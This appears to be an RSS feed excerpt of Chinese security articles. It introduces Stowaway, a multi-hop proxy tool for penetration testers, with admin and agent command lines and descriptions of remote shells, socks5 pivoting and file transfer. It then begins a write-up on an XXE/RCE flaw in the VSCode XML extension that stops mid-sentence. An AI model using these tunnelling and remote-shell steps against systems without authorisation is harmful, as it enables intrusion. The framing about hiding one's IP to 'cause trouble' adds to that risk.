&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7212301c3ccb617020a93eb1cc52f733_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;小王喜欢搞事情，有一天他发现顶着自己的真实 IP 去搞事情会被发现，于时他开始学习如何隐藏自己的真实 IP。&lt;/p&gt;&lt;p&gt;小王在网上找了个 IP 代理工具，本以为可以肆无忌惮的搞事情，没想到才用了 5 分钟就要收费，5 毛钱的辣条都要纠结半天的小王当然不乐意了。&lt;/p&gt;&lt;p&gt;进过小王的不懈努力，他终于找到了他心中的那个“她”。&lt;/p&gt;&lt;h2&gt;Stowaway&lt;/h2&gt;&lt;p&gt;这是一个面向渗透测试者的多跳代理工具，使用 go 语言开发，用户可使用它将外部流量通过多个节点代理至内网，并实现管理功能。（已兼容 Windows）&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/ph4ntonn/Stowaway&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/ph4ntonn/Sto&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;waway&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;263&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;263&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！&lt;/blockquote&gt;&lt;h2&gt;特点&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;一目了然的节点管理&lt;/li&gt;&lt;li&gt;多平台适配&lt;/li&gt;&lt;li&gt;多级 socks5 流量代理转发&lt;/li&gt;&lt;li&gt;ssh 代理连接&lt;/li&gt;&lt;li&gt;远程交互式 shell&lt;/li&gt;&lt;li&gt;上传及下载文件&lt;/li&gt;&lt;li&gt;节点间流量以 AES-256(CBC模式) 进行加密&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;使用方法&lt;/h2&gt;&lt;p&gt;Stowaway 分为 admin 端 和 agent 端 两种形式。&lt;/p&gt;&lt;blockquote&gt;不想编译的同学可以直接用 release 下编译完成的程序。&lt;br/&gt;下载：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/ph4ntonn/Stowaway/releases&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/ph4ntonn/Sto&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;waway/releases&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;Admin 端&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./stowaway admin -l 9999 -s 123
  命令解析：
  admin代表以admin模式启动
  -l 参数代表监听端口
  -s 参数代表节点通信加密密钥(admin端与agent端必须一致!)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;agent 端&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./stowaway agent -m 127.0.0.1:9999 -l 10000 --startnode -s 123 -r
  命令解析：
  agent代表以agent端模式启动
  -m 代表上一级节点的地址
  -l 代表监听端
  -s 参数代表节点通信加密密钥(admin端与agent端必须一致!)
  --startnode 代表此节点是agent端的第一个节点（第一个节点必须加上--startnode选项！若无--startnode表示为普通节点，命令与startnode一致）
  -r 代表以反向模式启动（即下级节点需要本节点主动连接而不是等待下级节点主动连接到本节点，若正向连接可以去除此选项）&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;测试&lt;/h2&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/ph4ntonn/Stowaway/releases&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/ph4ntonn/Sto&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;waway/releases&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;一个简单的例子（以一个 admin 端三个 agent 端为例）：&lt;/p&gt;&lt;p&gt;Admin 端：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;263&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;263&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-3f5cf7089e996d36ce08613e671791dc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;Startnode 端：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16b22798e13a2b80942d970ca634986_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;70&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-b16b22798e13a2b80942d970ca634986_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16b22798e13a2b80942d970ca634986_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;70&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-b16b22798e13a2b80942d970ca634986_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-b16b22798e13a2b80942d970ca634986_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;第一个普通 Node (设置为反向连接模式)：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-507219e39c87f4d169e2ef02ef9f10f4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;60&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-507219e39c87f4d169e2ef02ef9f10f4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-507219e39c87f4d169e2ef02ef9f10f4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;60&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-507219e39c87f4d169e2ef02ef9f10f4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-507219e39c87f4d169e2ef02ef9f10f4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;此时，进入（use 命令，本例中为 use 1）此节点的上级节点（即 startnode），利用命令connect 127.0.0.1:10001 即可将此反向模式节点加入网络&lt;/p&gt;&lt;p&gt;第二个普通Node：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ce8daf103aa5998900d3d54dba435419_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;72&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-ce8daf103aa5998900d3d54dba435419_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ce8daf103aa5998900d3d54dba435419_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;72&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-ce8daf103aa5998900d3d54dba435419_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ce8daf103aa5998900d3d54dba435419_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;连入完成后，admin 端查看节点：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6b5c42522a44b0e008c380e5baea34f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-6b5c42522a44b0e008c380e5baea34f6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6b5c42522a44b0e008c380e5baea34f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-6b5c42522a44b0e008c380e5baea34f6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6b5c42522a44b0e008c380e5baea34f6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;此时在 admin 端操控第二个普通 node 节点：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bf1e7c4cdc77c45554a05eb05e6fa83d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;420&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-bf1e7c4cdc77c45554a05eb05e6fa83d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bf1e7c4cdc77c45554a05eb05e6fa83d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;420&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-bf1e7c4cdc77c45554a05eb05e6fa83d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bf1e7c4cdc77c45554a05eb05e6fa83d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;打开远程 shell：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-090728877ae777a45fbf3c7f8e89eae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;439&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-090728877ae777a45fbf3c7f8e89eae2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-090728877ae777a45fbf3c7f8e89eae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;439&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-090728877ae777a45fbf3c7f8e89eae2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-090728877ae777a45fbf3c7f8e89eae2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;此时就可以在 admin 端操纵第二个普通节点的 shell&lt;/p&gt;&lt;p&gt;打开 socks5 代理：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f4cf99d9ccbccf162e8d8829d5c1b863_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;395&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-f4cf99d9ccbccf162e8d8829d5c1b863_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f4cf99d9ccbccf162e8d8829d5c1b863_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;395&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-f4cf99d9ccbccf162e8d8829d5c1b863_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f4cf99d9ccbccf162e8d8829d5c1b863_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;此时用户即可以将 admin 端的 7777 端口作为 socks5 代理端口，将流量代理至第二个普通 node 节点（当想关闭 socks 服务时，在节点模式下输入 stopsocks 即可关闭与此节点相关的 socks 代理服务）&lt;/p&gt;&lt;p&gt;打开 ssh：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6e91d1b8234710cb7872e2faabd7912f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;394&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-6e91d1b8234710cb7872e2faabd7912f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6e91d1b8234710cb7872e2faabd7912f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;394&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-6e91d1b8234710cb7872e2faabd7912f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-6e91d1b8234710cb7872e2faabd7912f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;此时第二个普通节点会作为ssh客户端,(此节点)会发起ssh连接来访问指定的 ssh 服务，并将 ssh 数据回传至 admin 端&lt;/p&gt;&lt;p&gt;PS: 在 ssh 模式下，你可以用 pwd 来判断自己所处的文件夹（好吧，其实就是没法把 banner 传回来。。）&lt;/p&gt;&lt;p&gt;上传/下载文件：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-08d5b0f6db3c01ebdce78963e104fcaa_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1414&quot; data-rawheight=&quot;810&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1414&quot; data-original=&quot;https://pic3.zhimg.com/v2-08d5b0f6db3c01ebdce78963e104fcaa_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-08d5b0f6db3c01ebdce78963e104fcaa_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1414&quot; data-rawheight=&quot;810&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1414&quot; data-original=&quot;https://pic3.zhimg.com/v2-08d5b0f6db3c01ebdce78963e104fcaa_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-08d5b0f6db3c01ebdce78963e104fcaa_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ec0a993999df6ed76f8f0074e1cfcccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1414&quot; data-rawheight=&quot;814&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1414&quot; data-original=&quot;https://pic4.zhimg.com/v2-ec0a993999df6ed76f8f0074e1cfcccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ec0a993999df6ed76f8f0074e1cfcccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1414&quot; data-rawheight=&quot;814&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1414&quot; data-original=&quot;https://pic4.zhimg.com/v2-ec0a993999df6ed76f8f0074e1cfcccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-ec0a993999df6ed76f8f0074e1cfcccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;上传下载功能命令为 upload/download 后加文件路径（注意要在节点模式下使用）,此时就可以上传文件至指定节点/下载指定节点的文件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;具体的命令使用可输入 help 查询&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包又更新了！学 Python 的也能当黑客了，多实战沉浸式体验，让你回味无穷。&lt;/p&gt;&lt;p&gt;这个春节，让你从 程序猿→黑客x程序员 PLUS！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-19-103463024</guid>
<pubDate>Sun, 19 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>VSCode 打开 XML 文件可能导致命令执行</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-18-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XML（XML 语言服务器）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213：XXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。&lt;br/&gt;CVE-2019-18212：目录遍历 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。&lt;/blockquote&gt;&lt;h2&gt;XXE 奇遇&lt;/h2&gt;&lt;p&gt;拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？&lt;/p&gt;&lt;h2&gt;探究&lt;/h2&gt;&lt;p&gt;在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。&lt;/p&gt;&lt;p&gt;为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。&lt;/p&gt;&lt;p&gt;所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML 该拓展插件的作用是提供了对创建和编辑 XML 